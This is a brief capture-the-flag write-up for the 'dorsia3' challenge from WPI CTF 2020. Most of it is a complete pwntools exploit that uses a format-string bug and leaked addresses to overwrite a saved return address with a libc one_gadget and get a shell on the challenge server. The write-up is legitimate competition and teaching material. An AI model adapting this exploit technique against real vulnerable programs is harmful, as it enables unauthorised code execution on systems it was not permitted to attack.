# dorsia3 250pts (55 solves) #

![TASK](https://imgur.com/vFmQYat.png)

We have a format string vulnerability and a leak of the buffer and system address so my idea was to overwrite the saved eip with the address of a one gadget from libc , we have all what we need so here is my full exploit.

I'll post a detailed writeup about this task in the next few days on my personal website so stay tuned (my twitter @BelkahlaAhmed1)!

![CODE](https://imgur.com/GSFhTJW.png)

```python

from pwn import *
def pad(str):
        return str+(60-len(str))*"B"
#p=process("./nanoprint")
p=remote("dorsia3.wpictf.xyz",31337)
data=p.recvline()
BUFFER=int(data[:10],16)
SYSTEM=int(data[-11:-1],16)+288
log.info("Buffer starts: "+hex(BUFFER))
log.info("System address: "+hex(SYSTEM))
BASE=SYSTEM-0x3d200
one_gadget=BASE+0x3d0e0
RET=BUFFER+0x71
RET2=RET+2
log.info("Writing to: "+hex(RET))
payload="B"
payload+=p32(RET)
payload+=p32(RET2)
off1=(one_gadget & 0xffff)-9
off2=int(hex(one_gadget & 0xffff0000)[:-4],16)-(one_gadget & 0xffff)
log.info("one gadget address: "+hex(one_gadget))
log.info("offset1 and 2: "+str(off1)+"|"+str(off2))
payload+="%"+str(off1)+"x"
payload+="%7$hn"
payload+="%"+str(off2)+"x"
payload+="%8$hn"
#pause()
p.sendline(pad(payload))
p.interactive()

#Offset buffer-ret : +0x71
#offset fmt 7

```

**Note:** : Here is the [binary](https://github.com/kahla-sec/CTF-Writeups/blob/master/WPI%20CTF%202020/dorsia3/nanoprint) and the [libc](https://github.com/kahla-sec/CTF-Writeups/blob/master/WPI%20CTF%202020/dorsia3/libc.so.6)

For any questions you can contact me on twitter @BelkahlaAhmed1 and thank you :D
